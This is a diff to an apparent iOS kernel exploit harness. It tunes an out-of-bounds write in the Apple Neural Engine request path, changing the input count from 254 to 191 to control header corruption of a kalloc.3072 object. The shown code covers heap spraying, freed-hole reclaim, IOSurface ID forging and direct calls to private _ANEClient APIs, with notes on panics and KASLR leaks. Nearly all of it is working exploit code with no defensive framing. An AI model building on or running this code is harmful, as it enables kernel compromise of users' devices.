@@ -59,7 +59,8 @@
 // No OOL memory descriptors. No syscall 536. NOT hasKread.
 //
 // v47 — RECORD SID FORGE (102 Chain 1 Step 2). 3072 engine unchanged.
-//   E1. TWO models in one process: A = 254in addchain (the OOB fire),
+//   E1. TWO models in one process: A = 191in addchain (v61 B1: count=192
+//       = exactly in-bounds; v47..v60 used the 254in OOB fire),
 //       B = XVRC27_127inmin_1out (the second live request / consumer).
 //   E2. Own IOSurface pool staged first (412 creates; last surface =
 //       sid_C staged MARK 0x53535353) so forge targets are REAL
@@ -153,32 +154,33 @@
 #import <math.h>
 #import <objc/message.h>
 
-#define P044_BUILD @"p044-v60-passthrough"
+#define P044_BUILD @"p044-v61-addchain191-B1"
 
-#define INPUT_COUNT 254
+#define INPUT_COUNT 191
 #define PAYLOAD_SIZE 0xb80
 #define PAIR_COUNT 2048
 #define DRAIN_COUNT 2048
-#define COREML_MODEL_NAME @"XVRC27_254in_1out_addchain"
+#define COREML_MODEL_NAME @"XVRC27_191in_1out_addchain"
 
-/* v60 passthrough vehicle (Oct-12 20:23): XVRC27_254in_passthrough.
-   Single variable vs v59: the MODEL. 254 inputs stay (record-table overflow
-   + OUTPUT record spill at body+0x444 stay); the ops become passthrough.
-   The 23F77 reject (status=0x2 statusType=0x9 'Program Inference error')
-   and the rig's pred=FAILED (accepted, but only the 2-byte 0x6a58 header
-   landed, no result) are both candidate PROGRAM-complexity symptoms, not
-   input-count symptoms. This run splits them:
-     accepted + foreign diff>0  -> program complexity was the 0x2/0x9 cause;
-                                   fill + foreign write in ONE fire (23F77).
-     rejected again 0x2/0x9    -> input-count/wired-capacity cause; next
-                                   vehicle = B-model (127in + 1out, 128
-                                   records, NO overflow) with the foreign
-                                   OUTPUT sid riding the in-bounds OUTPUT
-                                   record through the size/symbol gates.
-   Runtime override: app-container Documents/p044_model.txt (one line = the
-   model NAME; consumed on read — one file = one deliberate fire). Default
-   stays addchain. /var/mobile/Documents is NOT app-readable (same sandbox
-   bug class as the v59 sidecar). */
+/* v61 addchain-191 B1 (Oct-16, note 149): the vehicle is the HAND-WRITTEN
+   191-in/1-out MIL (buildInfo source tag 'addchain-191in1out B1', coremlc
+   3520.4.1 template-faithful — byte-identical to the 254 template except
+   the source tag), carried as a FLAT MIL dir (model.mil/options.plist/
+   weights1.bin at bundle root) and compiled ON DEVICE by _ANEModel
+   compileModel (v56 MIL-dir lane), so ANECCompile finally sees the
+   handwritten addchain. INPUT_COUNT 254->191: count=192 = EXACTLY
+   in-bounds for the fixed 192-record kalloc.3072 marshaling object
+   (note 127) — records 128..191 clobber the header (program@0x808 <-
+   fixed tail 0x0000000100000001, count@0x810 <- record 129's
+   compiler-assigned sid) but NOTHING spills past +0xC00. Oracles
+   unchanged (OUTPUT-SID lane, census stillness, out-entry scan). The
+   question this run answers: does the fire COMPLETE once count is
+   in-bounds (vs the 0x2/0x9 reject), and does the scrambled count@0x810
+   sid survive ANEC's header rewrite?
+   v60 history (Oct-12): passthrough ops at 254in — rejected 0x2/0x9 on
+   23F77; the program-complexity vs input-count split went unresolved.
+   v61 changes BOTH ops (back to addchain) AND count (191) — confound
+   accepted deliberately; note 149 documents why. */
 static NSString *g_modelNameOverride = nil;
 static NSString *p044_model_name(void) {
     return g_modelNameOverride ?: COREML_MODEL_NAME;
@@ -231,7 +233,7 @@ static BOOL p044_model_is_addchain(void) {
 #define ANE_REQ_OFF_TOTOUT 0x51cu
 #define ANE_REQ_OFF_OUT_IDS 0x52cu
 #define ANE_REQ_OFF_EVENTS 0x930u
-#define ANE_TOTIN 254u
+#define ANE_TOTIN 191u
 #define P044_HOLE_MODE 1 /* 1 = freed-hole lane + reclaim read-back; 0 = live-kmsg lane; 2 = contiguous-run frees (DEAD per 101ae: modified-after-free panic or kernel zeroing — do not re-enable) */
 #define P044_HOLE_RUN_LO 1024u /* v48.2: free pairs [LO..HI) hole+victim — adjacent elements */
 #define P044_HOLE_RUN_HI 1536u
@@ -654,8 +656,9 @@ static void p044_stage_surfaces(uint32_t *sidsOut, uint32_t maxOut,
    No raw IOConnect send: the program handle binds to the loading connection
    (run#1: fresh conn -> sel0 kr=0x5, sel2 0xe00002c2). */
 
-#define P044_REQ_IN 254u
-/* v58 REQ_IN sweep scaffold (note 130 Phase K1): default 254. Before build,
+#define P044_REQ_IN 191u
+/* v58 REQ_IN sweep scaffold (note 130 Phase K1): default 191 (v61 B1:
+   count=192 = exactly in-bounds, note 149). Before build,
    PHASE 3 reads Documents/p044_req_in.txt if present — a single "N" line —
    and overrides P044_REQ_IN at runtime. Sweep protocol: one fire per
    force-quit, N = 193, 196, 200, 224, 255; (N-192) = records written OOB
@@ -927,7 +930,7 @@ static int p044_ane_build_request(NSMutableString *out) {
         } else {
             CFRelease(s);
         }
-        g_p044_outSid = sid; /* v50: output entry lands at symbolIndex 254 (0xfe) */
+        g_p044_outSid = sid; /* v61: output entry lands at symbolIndex 191 (0xbf) with the 191-in request */
         if (g_forgeCount < FORGE_MAX) g_forgeSids[g_forgeCount++] = sid;
         id obj = ((id (*)(id, SEL, CFTypeRef))objc_msgSend)(surfCls, wrapSel, s);
         if (!obj) {
@@ -1174,7 +1177,10 @@ static void *watch_worker(void *arg) {
         } else {
             value = (double)(i + 1);
         }
-        NSString *name = [NSString stringWithFormat:@"x_%03u", i];
+        /* v61: the handwritten MIL names inputs in_0..in_190 (no padding);
+           the old x_%03u names never bound for the handwritten bundle.
+           providerB keeps x_%03u — model B is the Xcode-compiled bundle. */
+        NSString *name = [NSString stringWithFormat:@"in_%u", i];
 
         NSError *err = nil;
         MLMultiArray *array = [[MLMultiArray alloc] initWithShape:@[@1]
@@ -1728,7 +1734,7 @@ static void *watch_worker(void *arg) {
                 p044ReqInOverride = n;
                 [out appendFormat:@"  [v58] REQ_IN OVERRIDE=%u (from app Documents/p044_req_in.txt; file consumed)\n", n];
             } else {
-                [out appendFormat:@"  [v58] p044_req_in.txt present but N=%u out of range 2..4096 — default 254 kept\n", n];
+                [out appendFormat:@"  [v58] p044_req_in.txt present but N=%u out of range 2..4096 — default 191 kept\n", n];
             }
             unlink(sweepPath.fileSystemRepresentation);
         }
@@ -1931,11 +1937,11 @@ static void *watch_worker(void *arg) {
     p044_ane_load_model(milURL ?: modelURL, modelURL, out);
     p044_write_log(out);
 
-    // 3c. Build _ANERequest — 254 input surfaces = OUR sids, BEFORE the spray
-    [out appendString:@"\n=== PHASE 3c: build _ANERequest (254x0x4000 inputs + 1x0x4000 output, sids -> forge set) ===\n"];
+    // 3c. Build _ANERequest — 191 input surfaces = OUR sids, BEFORE the spray
+    [out appendString:@"\n=== PHASE 3c: build _ANERequest (191x0x4000 inputs + 1x0x4000 output, sids -> forge set) ===\n"];
     g_aneReqOk = p044_ane_build_request(out);
     if (!g_aneReqOk) {
-        [out appendString:@"  [!] request not built — fire falls back to CoreML 254 predict (ids[] neutered)\n"];
+        [out appendString:@"  [!] request not built — fire falls back to CoreML 191 predict (ids[] neutered)\n"];
     }
     p044_write_log(out);
 
@@ -2014,7 +2020,7 @@ static void *watch_worker(void *arg) {
     p044_write_log(out);
 
     // 6. FIRE — v48.1 G1/G2: _ANEClient doEvaluateDirectWithModel, ids[] = OUR request surfaces
-    [out appendString:@"\n=== PHASE 5: FIRE — _ANEClient doEvaluateDirectWithModel (254 request surfaces) ===\n"];
+    [out appendString:@"\n=== PHASE 5: FIRE — _ANEClient doEvaluateDirectWithModel (191 request surfaces) ===\n"];
     [out appendString:@">>> ids[] = OUR staged surface sids, indices 0..253 -> overflow records [our sid][0xc0+k][1][1] <<<\n"];
     [out appendString:@">>> CheckandPrewire: capacity 192, NO bound check, 16B stride INLINE in kalloc.3072 <<<\n"];
     [out appendString:@">>> PANIC POSSIBLE — ips will have KASLR <<<\n\n"];
@@ -2035,7 +2041,7 @@ static void *watch_worker(void *arg) {
             [out appendString:@"  [!] evaluate not attempted\n"];
         }
     } else {
-        [out appendString:@"  _ANEClient lane unavailable — falling back to CoreML 254 predict (ids[] neutered)\n"];
+        [out appendString:@"  _ANEClient lane unavailable — falling back to CoreML 191 predict (ids[] neutered)\n"];
         fireMode = @"coreml-fallback";
     }
     if ([fireMode isEqual:@"coreml-fallback"]) {
